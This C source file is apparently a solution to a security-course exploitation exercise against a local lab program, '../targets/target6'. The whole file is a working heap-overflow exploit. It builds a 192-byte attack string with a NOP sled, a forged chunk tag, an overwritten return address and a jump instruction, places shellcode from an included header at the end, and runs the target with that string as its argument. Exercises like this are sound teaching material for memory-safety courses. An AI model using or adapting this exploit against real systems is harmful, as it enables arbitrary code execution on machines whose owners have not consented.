#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

int main(void)
{
  char *args[3];
  char *env[1];

	char attack_string[192];
	memset(attack_string, '\x90', 192);

	// making a fake tag
	strcpy(&attack_string[72], "\x80\xee\x04\x01");

	// setting the return address
	strcpy(&attack_string[76], "\x68\xfe\x21\x20");
	attack_string[80]='\x90';

	// jump 4 bytes
	strcpy(&attack_string[90], "\xeb\x04");
	// set the chuck tag to 1
	attack_string[92] = 1;	

	// write the shellcode to the end of attack_string
	memcpy(&attack_string[192-strlen(shellcode)], shellcode, strlen(shellcode));

  args[0] = TARGET; args[1] = attack_string; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
